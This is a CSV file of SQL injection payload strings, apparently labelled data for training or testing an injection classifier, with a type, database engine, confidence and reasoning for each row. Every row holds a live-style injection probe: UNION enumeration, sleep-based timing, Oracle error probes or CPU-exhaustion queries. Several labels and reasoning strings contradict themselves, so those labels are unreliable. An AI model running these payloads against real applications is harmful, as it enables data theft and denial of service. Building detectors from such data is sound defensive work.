id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22389,1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 4694 = 4694,error_based,oracle,0.90,"xmltype() with chr() encoding + dual table is Oracle error-based SQLi; UPPER() + chr concatenation + CASE WHEN confirms Oracle signature",3
22390,"1"" ) where 7471 = 7471 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.75,"regexp_substring + repeat(500000000) causes CPU exhaustion; char() encoding suggests PostgreSQL but classified as generic",2
22391,if ( 4947 = 5350 ) select 4947 else drop function ereg--,boolean_blind,generic,0.65,"IF...THEN...ELSE...DROP FUNCTION is stacked-query-like but syntax is incomplete; boolean-blind interpretation due to IF conditional structure",1
22392,"1'|| ( select 'jrbp' from dual where 4129 = 4129 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",heavy_query,oracle,0.80,"benchmark() is MySQL function but appears with Oracle dual table + || concatenation; heuristic labels as heavy-query due to numeric constant 5000000",2
22393,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and 'pczr' = 'pczr",heavy_query,generic,0.75,"regexp_substring + repeat(500000000) causes CPU-based timing attack; CALL keyword suggests stored procedure context, classified as heavy-query",2
22394,"1 ) where 9059 = 9059 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.85,"extractvalue() is MySQL error-based XPath function; CONCAT() + hex encoding + ELT() boolean oracle within error context confirms error-based SQLi",2
22395,"1 ) as azdb where 4219 = 4219 union all select null,null,null,null#",union_based,generic,0.75,"UNION ALL SELECT with 4 NULL placeholders is union-based injection; generic database",2
22396,"1"" ) ) as xtlt where 9293 = 9293",boolean_blind,generic,0.60,"Simple WHERE equality test without injection signal; incomplete payload suspicious of benign classification",1
22397,"1 ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 9542 = 9542",heavy_query,generic,0.75,"regexp_substring + repeat(5000000000) causes CPU exhaustion; char() encoding + large numeric constant confirm heavy-query DoS",2
22398,"1"" ) where 2152 = 2152",boolean_blind,generic,0.60,"Minimal payload with simple equality test; unclear injection context, low confidence due to benign appearance",1
22399,"1"" ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.75,"regexp_substring + repeat(500000000) + crypt_key creates heavy CPU computation; char() encoding typical PostgreSQL, classified as generic",2
22400,"1 union all select null,null--",union_based,generic,0.75,"UNION ALL SELECT with 2 NULL placeholders is union-based injection",2
22401,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( 3508 = 3508",boolean_blind,oracle,0.75,"all_users table with 5-way Cartesian join suggests Oracle; AND equality at end indicates boolean-blind with heavy computation, primary technique is boolean-blind",2
22402,"-7531' ) ) ) union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",union_based,generic,0.75,"UNION ALL SELECT with 9-column result set is union-based injection",2
22403,"1%' ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( '%' = '",boolean_blind,mssql,0.80,"MSSQL sysusers 7-way Cartesian join in subquery with AND equality; boolean-blind injection confirmed despite heavy computation component",2
22404,1'+ ( select 'yhcf' where 8367 = 8367,boolean_blind,generic,0.65,"Simple SELECT WHERE equality; very generic pattern without specific attack markers",1
22405,1' ) where 8707 = 8707 and 3210 = 1477--,boolean_blind,generic,0.70,"OR/AND equality-based boolean injection; generic database signature",2
22406,"1' in boolean mode ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.80,"Firebird rdb$* system tables with 4-way Cartesian join; 'in boolean mode' suggests fulltext context but primary injection is OR equality, boolean-blind dominates",2
22407,-1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,0.90,"xmltype() error function with chr() encoding + dual table confirms Oracle error-based SQLi; UPPER() + CASE WHEN + OR equality structure validates signature",3
22408,"1"" ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""agaz"" = ""agaz",boolean_blind,mssql,0.80,"MSSQL sysusers 7-way Cartesian join with AND equality; boolean-blind injection pattern confirmed",2
22409,"-1422%"" ) or make_set ( 9539 = 9519,9519 ) and ( ""%"" = """,boolean_blind,mysql,0.75,"MAKE_SET() is MySQL boolean-based function (returns string based on bitmask condition); OR-based equality confirms boolean-blind injection",2
22410,"-8734%"" ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""%"" = """,error_based,oracle,0.90,"utl_inaddr.get_host_address() is Oracle error-based OOB function; chr() encoding + CASE WHEN + dual confirms Oracle error-based SQLi",3
22411,1'|| ( select 'aevx' from dual where 9999 = 9999,boolean_blind,oracle,0.75,"dual pseudo-table + || concatenation with SELECT WHERE equality; Oracle boolean-blind pattern",2
22412,"1"" ) as amak where 7938 = 7938 and elt ( 1210 = 1210,sleep ( 5 ) ) --",boolean_blind,mysql,0.85,"ELT() boolean-based function with sleep(5) timing oracle; MySQL signature confirmed, boolean-blind injection",2
22413,1'+ ( select snam where 1993 = 1993,boolean_blind,generic,0.65,"Simple SELECT WHERE equality; minimal attack signal, very generic pattern",1
22414,"1"" ) as bpmk where 4506 = 4506",boolean_blind,generic,0.60,"Incomplete payload with simple WHERE equality; low confidence due to benign appearance",1
22415,"1' ) ) as crzr where 5373 = 5373 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.85,"ELT() boolean-based function with sleep(5) timing oracle; MySQL confirmed, boolean-blind injection",2
22416,"1"" ) as mohv where 2171 = 2171 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,mysql,0.85,"sleep(5) in subquery confirms MySQL time-based sleep; OR equality with explicit timing function, time-blind SQLi",3
22417,"1"" ) where 9295 = 9295 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",boolean_blind,oracle,0.75,"dbms_utility.sqlid_to_sqlhash() is Oracle function (not error-triggering); chr() encoding + dual + CASE WHEN confirms Oracle, but classified as boolean-blind",2
22418,1%' ) ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ( '%' = ',boolean_blind,mysql,0.75,"RLIKE() is MySQL regex-based boolean function; CASE WHEN conditional execution confirms boolean-blind injection",2
22419,1' in boolean mode ) and 4595 = 4595#,boolean_blind,generic,0.65,"AND equality test with 'in boolean mode' fulltext context; generic database signature, simple boolean pattern",1
22420,"-4259' ) ) as usqu where 5419 = 5419 or elt ( 8325 = 8837,8837 ) --",boolean_blind,mysql,0.75,"ELT() boolean-based function with OR inequality test; MySQL confirmed, boolean-blind injection pattern",2
22421,1'+ ( select qsmo where 3172 = 3172,boolean_blind,generic,0.65,"Simple SELECT WHERE equality; minimal attack signal, very generic pattern",1
22422,"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'iari' = 'iari",heavy_query,sqlite,0.80,"randomblob(500000000/2) is SQLite time-delay function; hex() + LIKE() with large blob creates timing-based attack, classified as heavy-query",2
22423,"-4606"" ) as elek where 8261 = 8261 or 8571 = 8571--",boolean_blind,generic,0.70,"OR-based equality tests; generic database signature, boolean-blind pattern",2
22424,1%' order by 1--,boolean_blind,generic,0.55,"ORDER BY column enumeration; minimal SQLi signal, suspicious of benign/invalid classification",1
22425,"-1591 where 3291 = 3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",union_based,generic,0.75,"UNION ALL SELECT with 9-column result set is union-based injection",2
22426,"-8069 ) ) as sxbn where 7689 = 7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",union_based,generic,0.75,"UNION ALL SELECT with 10-column result set is union-based injection",2
22427,"1' ) ) ) union all select null,null,null,null,null,null--",union_based,generic,0.75,"UNION ALL SELECT with 6 NULL placeholders is union-based injection",2
22428,1'|| ( select 'kitk' where 6311 = 6311,boolean_blind,oracle,0.75,"|| concatenation with SELECT WHERE equality; Oracle boolean-blind pattern (dual implied)",2
22429,1' ) ) and sleep ( 5 ) and ( ( 'krrr' = 'krrr,time_blind,mysql,0.95,"sleep(5) is MySQL time-based sleep function; explicit timing function confirms time-blind SQLi",3
22430,"1'|| ( select 'lxpg' where 7390 = 7390 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",boolean_blind,oracle,0.80,"all_users table with 5-way Cartesian join confirms Oracle; || concatenation with AND equality indicates boolean-blind with heavy computation",2
22431,"1 where 7906 = 7906 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.85,"generate_series(1,5000000) is PostgreSQL heavy-computation DoS; large numeric range creates timing-based attack",2
22432,"-6116"" ) ) union all select 3679,3679,3679,3679,3679,3679,3679--",union_based,generic,0.75,"UNION ALL SELECT with 7-column result set is union-based injection",2
22433,"1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'lxqz' = 'lxqz",heavy_query,mysql,0.75,"Large numeric constant (8446744073709551610) + ELT() + CONCAT() + IF() creates overflow-based DoS; classified as heavy-query despite boolean-blind components",2
22434,"-2153'|| ( select 'sofs' where 4126 = 4126 union all select 4126,4126,4126,4126,4126#",union_based,oracle,0.75,"UNION ALL SELECT with 5-column result set; || concatenation suggests Oracle, union-based injection confirmed",2
22435,1 ) ) as pjkd where 1105 = 1105 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,error_based,oracle,0.90,"utl_inaddr.get_host_address() is Oracle OOB error function; chr() + dual + CASE WHEN confirm Oracle error-based SQLi",3
22436,"1'+ ( select jqyo where 4426 = 4426 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",boolean_blind,generic,0.70,"domain.* Cartesian join with 3-way relationship; AND equality is boolean-blind, DB generic without specific function signature",2
22437,"1' ) ) as ticp where 9794 = 9794 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.75,"UNION ALL SELECT with 8 NULL placeholders is union-based injection",2
22438,"1' union all select null,null,null,null,null,null,null#",union_based,generic,0.75,"UNION ALL SELECT with 7 NULL placeholders is union-based injection",2
22439,"1"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""qqfd"" like ""qqfd",boolean_blind,oracle,0.75,"dbms_utility.sqlid_to_sqlhash() is Oracle function; chr() + dual + CASE WHEN + AND equality confirms Oracle boolean-blind injection",2
22440,1'+ ( select brgo where 9100 = 9100 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.95,"pg_sleep(5) is PostgreSQL time-based sleep function; explicit timing function confirms time-blind SQLi",3
22441,"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( 'xdfz' = 'xdfz",heavy_query,generic,0.75,"regexp_substring + repeat(5000000000) causes CPU exhaustion; char() encoding typical PostgreSQL, classified as generic heavy-query",2
22442,"-9451%"" ) union all select 9963,9963,9963--",union_based,generic,0.75,"UNION ALL SELECT with 3-column result set is union-based injection",2
